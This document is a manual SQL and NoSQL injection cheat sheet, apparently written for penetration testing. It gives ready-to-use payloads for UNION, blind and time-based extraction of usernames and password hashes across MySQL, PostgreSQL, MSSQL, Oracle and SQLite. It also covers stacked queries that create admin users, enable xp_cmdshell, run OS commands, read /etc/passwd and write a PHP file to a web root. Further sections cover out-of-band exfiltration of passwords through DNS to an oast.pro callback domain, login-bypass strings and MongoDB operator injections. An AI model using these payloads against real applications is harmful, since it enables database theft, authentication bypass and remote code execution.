# Manual SQL injection — payloads, fingerprints, techniques

## 1. Context discovery

The injected value lands inside a query like `... WHERE id = <HERE>` (numeric),
`... WHERE name = '<HERE>'` (single-quoted string), `"..."` (double-quoted, PG identifiers /
MySQL ANSI mode), or inside `LIKE '%<HERE>%'`, `ORDER BY <HERE>`, `IN (<HERE>)`, `LIMIT <HERE>`.
Probe set (URL-encode as needed):

```
'    "    `    ')    ")    '))    \    ;    ' -- -    '#    '/*
```

- Error on `'` but not `"` → single-quoted string context.
- No error ever, but `1` vs `2-1` return the same row → numeric context, math is evaluated.
- `ORDER BY`/column-name contexts take no quotes: inject `(SELECT 1)` / `(CASE WHEN ... )`.

Escaping: if `'` becomes `\'`, try `\'` (escape the escape) or GBK-style `%bf%27` on legacy
MySQL; if quotes are stripped, use hex (`0x61646d696e`) or `CHAR(97,100,109,105,110)`.

## 2. DBMS fingerprint

### Error strings

| String fragment | DBMS |
|---|---|
| `You have an error in your SQL syntax` / `MySQL server version` | MySQL/MariaDB |
| `unterminated quoted string` / `pg_query()` / `PG::SyntaxError` / `PSQLException` | PostgreSQL |
| `Unclosed quotation mark after the character string` / `Incorrect syntax near` / `ODBC SQL Server Driver` | MSSQL |
| `ORA-00933` / `ORA-01756` / `quoted string not properly terminated` | Oracle |
| `SQLITE_ERROR` / `unrecognized token` / `sqlite3.OperationalError` | SQLite |

### Behavioral fingerprint (no errors shown)

| Probe | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| String concat | `'a' 'b'`, `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` | `'a'\|\|'b'` |
| Version | `@@version`, `VERSION()` | `version()` | `@@version` | `v$version` (`banner`) | `sqlite_version()` |
| Comment | `#`, `-- `, `/**/` | `--`, `/**/` | `--`, `/**/` | `--` | `--`, `/**/` |
| Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` | heavy `RANDOMBLOB` |
| Dummy table | — | — | — | `FROM dual` required | — |

Quick test: `' AND 'a'='a' 'b'` succeeds only on MySQL (adjacent-literal concat);
`'||'` concat working rules out MSSQL defaults.

## 3. UNION-based extraction

1. Column count: `' ORDER BY 1-- -` … increment until error; or binary-search
   `' UNION SELECT NULL-- -`, `NULL,NULL`, … until no error.
2. Printable columns: `' UNION SELECT 'a1','a2','a3'-- -` (Oracle: types must match —
   use `NULL` then substitute per column; always `FROM dual`).
3. Extract:

```sql
-- MySQL
' UNION SELECT group_concat(schema_name),2 FROM information_schema.schemata-- -
' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT group_concat(username,0x3a,password SEPARATOR 0x0a),2 FROM users-- -
-- PostgreSQL
' UNION SELECT string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'--
' UNION SELECT string_agg(usename||':'||passwd,chr(10)),NULL FROM pg_shadow--
-- MSSQL
' UNION SELECT STRING_AGG(name,','),NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT name,NULL FROM master..sysdatabases--
-- Oracle
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT username||':'||password,NULL FROM all_users--
-- SQLite
' UNION SELECT group_concat(sql),NULL FROM sqlite_master-- -
```

Too few visible columns? Concatenate everything into one. Type mismatch? `CAST(x AS CHAR)`
(MySQL) / `x::text` (PG) / `CAST(x AS varchar)` (MSSQL).

## 4. Boolean-blind extraction

Oracle: append `FROM dual` to subqueries. Template (MySQL shown):

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>77-- -
' AND (SELECT COUNT(*) FROM users)>10-- -
```

Binary-search ASCII (`>77`, `>102`, …) = 7 requests/char. Equivalents:
PG `SUBSTR(x,1,1)`/`ASCII`, MSSQL `SUBSTRING`/`UNICODE`, Oracle `SUBSTR`/`ASCII`.
TRUE/FALSE oracle = any stable diff: body length, a string present/absent, status code,
redirect vs not. Automate with sqlmap `--technique=B --string="..."` once confirmed by hand.

## 5. Time-blind extraction

```sql
-- MySQL
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(5),0)-- -
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -         -- works in more contexts
-- PostgreSQL
';SELECT CASE WHEN (ASCII(SUBSTR((SELECT passwd FROM pg_shadow LIMIT 1),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND 1=(SELECT 1 FROM pg_sleep(5))--                 -- inline, no stacking needed
-- MSSQL
';IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1)))>77 WAITFOR DELAY '0:0:5'--
-- Oracle
' AND 1=(CASE WHEN ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>77 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
-- SQLite (CPU burn, no sleep())
' AND (CASE WHEN (1=1) THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 0 END)-- -
```

Measure 5+ baselines first; alternate TRUE/FALSE probes to cancel network jitter; use
`sqlmap --technique=T --time-sec=5 --threads=5` for the bulk extraction.

## 6. Stacked queries & write primitives

Stacking (`'; <stmt>--`) works: MSSQL (almost always), PostgreSQL (most drivers),
MySQL (only `mysqli_multi_query`/some ORMs — rare). Enables:

```sql
';INSERT INTO users(username,password,role) VALUES('vulture','...','admin')--
';UPDATE users SET password='...' WHERE username='admin'--
';EXEC xp_cmdshell 'whoami'--                               -- MSSQL (sysadmin)
';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--
';COPY (SELECT '') TO PROGRAM 'id'--                        -- PostgreSQL superuser RCE
';CREATE TABLE t(x text);COPY t FROM '/etc/passwd'--        -- PG file read
' UNION SELECT LOAD_FILE('/etc/passwd'),2-- -               -- MySQL FILE priv
' UNION SELECT 'pwn',2 INTO OUTFILE '/var/www/html/s.php'-- -
```

## 7. Out-of-band (OOB)

When responses are totally blind and time-based is too slow — exfiltrate via DNS/HTTP to an
interactsh domain (`interactsh-client` gives you `<id>.oast.pro`):

```sql
-- MySQL (Windows, needs FILE): SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.x.oast.pro\\a'))
-- MSSQL: ';EXEC master..xp_dirtree '\\'+(SELECT TOP 1 name FROM sysobjects)+'.x.oast.pro\a'--
-- PostgreSQL: ';COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).x.oast.pro'--
-- Oracle: ' AND 1=(SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.x.oast.pro') FROM dual)--
```

sqlmap automates this with `--dns-domain=x.oast.pro` (requires running sqlmap as the
authoritative NS for that domain).

## 8. Login-bypass quick list

```
' OR '1'='1' -- -
' OR 1=1-- -
admin'-- -
admin'#
') OR ('1'='1
' OR '1'='1' LIMIT 1-- -
```

## 9. NoSQL injection (CWE-943)

MongoDB and friends — no quotes/SQL errors; inject **operators** instead.

### Query-string / form-encoded (qs/PHP array parsing)

```
username[$ne]=x&password[$ne]=x            → {username:{$ne:"x"}, password:{$ne:"x"}}  auth bypass
username=admin&password[$regex]=^a         → char-by-char password extraction
username[$in][]=admin&username[$in][]=root
password[$gt]=                              → matches any non-empty value
```

### JSON bodies

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": "admin", "pass": {"$regex": "^s3c"}}
{"$where": "sleep(5000)"}
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
```

Blind extraction: iterate `{"$regex":"^a"}`, `^b`, … then `^s`, `^s3`, … — a login success /
different response confirms each prefix. `$where` with `sleep()` gives a time oracle on
server-side-JS-enabled Mongo. SSJI in `$where`/`mapReduce`:
`'; return true; var x='` inside string-concatenated JS filters.

### Tools

- **NoSQLMap** — `python nosqlmap.py`, interactive menu; MongoDB auth bypass, data
  extraction, Mongo-specific exploits.
- **nosqli** — Go scanner: `nosqli scan -t "https://192.0.2.10/login"` (error, boolean,
  timing checks); `-r request.txt` for raw requests.

Classify NoSQL findings as CWE-943 (improper neutralization in data query logic) under
WSTG-INPV-05/06; severity mirrors SQLi (auth bypass or data extraction = high+).
